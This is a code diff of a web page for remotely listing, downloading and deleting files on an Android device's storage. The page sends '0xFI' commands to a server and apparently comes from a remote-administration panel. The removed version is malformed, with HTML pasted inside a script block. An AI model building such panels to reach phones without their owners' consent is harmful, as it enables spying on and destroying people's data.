@@ -1,164 +1,140 @@
-<div class="ui segment">
-    <div class="ui secondary menu">
-        <div class="right menu">
-            <button onclick="openDirectory(this, '/storage/emulated/0')" class="ui blue button dlop"> <i
-                    class="icon home"></i>Home</button>
-            <!-- Home = /storage/emulated/0 -->
-        </div>
-    </div>
-    <table class="ui celled table">
-        <thead>
-            <tr>
-                <th style="text-align: center" colspan="2">Files</th>
-            </tr>
-        </thead>
-        <tbody>
-            <% pageData.forEach((item) => { %>
-            <tr>
-                <td title="<%= item.path %>"><%= item.name %></td>
-                <td class="collapsing">
-                    <% if(!item.isDir) { %>
-                    <button class="ui button dlop" onclick="downloadFile(this, '<%= item.path %>')">&nbsp;&nbsp;&nbsp;<i
-                            class="icon download blue"></i></button>
-                    <% } else { %>
-                    <button class="ui button dlop"
-                        onclick="openDirectory(this, '<%= item.path %>')">&nbsp;&nbsp;&nbsp;<i
-                            class="icon folder open grey"></i></button>
-                    <% } %>
-                </td>
-            </tr>
-            <% }) %>
-        </tbody>
-    </table>
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>عرض ملفات SD Card</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            padding: 20px;
+        }
+        #file-list {
+            margin-top: 20px;
+        }
+        .file-item {
+            background-color: #fff;
+            padding: 10px;
+            border: 1px solid #ddd;
+            margin-bottom: 5px;
+            border-radius: 5px;
+        }
+        .file-item button {
+            margin-left: 10px;
+        }
+    </style>
+</head>
+<body>
+    <h1>عرض ملفات SD Card</h1>
+    <button id="home-button">عرض الملفات</button>
+    <div id="file-list"></div>
 
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <script>
-
-<div class="ui segment">
-    <div class="ui secondary menu">
-        <div class="right menu">
-            <button onclick="openDirectory(this, '/storage/emulated/0')" class="ui blue button dlop">
-                <i class="icon home"></i>Home
-            </button>
-        </div>
-    </div>
-    <table class="ui celled table">
-        <thead>
-            <tr>
-                <th style="text-align: center" colspan="3">Files</th>
-            </tr>
-        </thead>
-        <tbody>
-            <% pageData.forEach((item) => { %>
-            <tr>
-                <td title="<%= item.path %>"><%= item.name %></td>
-                <td class="collapsing">
-                    <% if(!item.isDir) { %>
-                    <button class="ui button dlop" onclick="downloadFile(this, '<%= item.path %>')">
-                        <i class="icon download blue"></i>
-                    </button>
-                    <% } else { %>
-                    <button class="ui button dlop" onclick="openDirectory(this, '<%= item.path %>')">
-                        <i class="icon folder open grey"></i>
-                    </button>
-                    <% } %>
-                </td>
-                <td class="collapsing">
-                    <button class="ui button dlop" onclick="deleteFile(this, '<%= item.path %>')">
-                        <i class="icon trash red"></i>
-                    </button>
-                </td>
-            </tr>
-            <% }) %>
-        </tbody>
-    </table>
-
-    <script>
-        function openDirectory(element, path) {
-            $(element).children().css("opacity", "0");
-            $(element).addClass('blue');
-            $(element).addClass('loading');
-            $('.dlop').addClass('disabled');
+        // وظيفة لجلب الملفات من SD Card
+        function fetchFiles() {
             sendCommand('0xFI', {
-                action: 'ls',
-                path
+                action: 'list',
+                path: '/sdcard' // المسار إلى SD Card
             }, (error, message) => {
                 if (error) {
-                    setTimeout(() => {
-                        showNotification('#f03434', error);
-                        $(element).children().css("opacity", "1");
-                        $(element).removeClass('blue');
-                        $('.dlop').removeClass('loading');
-                    }, 300);
+                    showNotification('#f03434', error);
                 } else {
-                    if (message === 'Requested') {
-                        showNotification('#2ecc71', 'Requesting Files, Please Wait');
-                        setTimeout(() => {
-                            location.reload();
-                        }, 500);
-                    }
+                    displayFiles(message.files); // عرض الملفات
                 }
             });
         }
 
-        function downloadFile(element, path) {
-            $(element).children().css("opacity", "0");
-            $(element).addClass('green');
-            $(element).addClass('loading');
-            $('.dlop').addClass('disabled');
+        // وظيفة لعرض الملفات في الواجهة
+        function displayFiles(files) {
+            const fileList = document.getElementById('file-list');
+            fileList.innerHTML = ''; // مسح المحتوى الحالي
+
+            files.forEach(file => {
+                const fileElement = document.createElement('div');
+                fileElement.className = 'file-item';
+                fileElement.textContent = file.name;
+
+                // زر لتنزيل الملف
+                const downloadButton = document.createElement('button');
+                downloadButton.textContent = 'تنزيل';
+                downloadButton.onclick = () => downloadFile(file.path);
+
+                // زر لحذف الملف
+                const deleteButton = document.createElement('button');
+                deleteButton.textContent = 'حذف';
+                deleteButton.onclick = () => deleteFile(file.path);
+
+                fileElement.appendChild(downloadButton);
+                fileElement.appendChild(deleteButton);
+                fileList.appendChild(fileElement);
+            });
+        }
+
+        // وظيفة لتنزيل الملف
+        function downloadFile(path) {
             sendCommand('0xFI', {
                 action: 'dl',
                 path
             }, (error, message) => {
                 if (error) {
-                    setTimeout(() => {
-                        showNotification('#f03434', error);
-                        $(element).children().css("opacity", "1");
-                        $(element).removeClass('green');
-                        $('.dlop').removeClass('disabled');
-                    }, 300);
+                    showNotification('#f03434', error);
                 } else {
-                    if (message === 'Requested') {
-                        setTimeout(() => {
-                            $(element).children().css("opacity", "1");
-                            $(element).removeClass('green');
-                            $(element).removeClass('loading');
-                            $('.dlop').removeClass('disabled');
-                            showNotification('#2ecc71', 'Downloading File, It will be available in `Downloads` Soon');
-                        }, 300);
-                    }
+                    showNotification('#2ecc71', 'جاري تنزيل الملف...');
                 }
             });
         }
 
-        function deleteFile(element, path) {
-            $(element).children().css("opacity", "0");
-            $(element).addClass('red');
-            $(element).addClass('loading');
-            $('.dlop').addClass('disabled');
+        // وظيفة لحذف الملف
+        function deleteFile(path) {
             sendCommand('0xFI', {
                 action: 'rm',
                 path
             }, (error, message) => {
                 if (error) {
-                    setTimeout(() => {
-                        showNotification('#f03434', error);
-                        $(element).children().css("opacity", "1");
-                        $(element).removeClass('red');
-                        $('.dlop').removeClass('disabled');
-                    }, 300);
+                    showNotification('#f03434', error);
                 } else {
-                    if (message === 'Requested') {
-                        setTimeout(() => {
-                            $(element).children().css("opacity", "1");
-                            $(element).removeClass('red');
-                            $(element).removeClass('loading');
-                            $('.dlop').removeClass('disabled');
-                            showNotification('#2ecc71', 'File Deleted Successfully');
-                            location.reload(); // إعادة تحميل الصفحة لتحديث قائمة الملفات
-                        }, 300);
-                    }
+                    showNotification('#2ecc71', 'تم حذف الملف بنجاح');
+                    fetchFiles(); // إعادة تحميل الملفات بعد الحذف
                 }
             });
         }
+
+        // وظيفة لإرسال الأوامر إلى الخادم
+        function sendCommand(command, data, callback) {
+            $.ajax({
+                url: '/api/command', // رابط API الخاص بالخادم
+                method: 'POST',
+                data: { command, ...data },
+                success: function(response) {
+                    callback(null, response);
+                },
+                error: function(xhr, status, error) {
+                    callback(error || 'حدث خطأ أثناء الاتصال بالخادم');
+                }
+            });
+        }
+
+        // وظيفة لعرض الإشعارات
+        function showNotification(color, message) {
+            const notification = document.createElement('div');
+            notification.style.backgroundColor = color;
+            notification.style.color = '#fff';
+            notification.style.padding = '10px';
+            notification.style.position = 'fixed';
+            notification.style.bottom = '20px';
+            notification.style.right = '20px';
+            notification.style.borderRadius = '5px';
+            notification.textContent = message;
+            document.body.appendChild(notification);
+            setTimeout(() => {
+                notification.remove();
+            }, 3000);
+        }
+
+        // ربط حدث النقر على زر "عرض الملفات"
+        document.getElementById('home-button').addEventListener('click', fetchFiles);
     </script>
-</div>
+</body>
+</html>
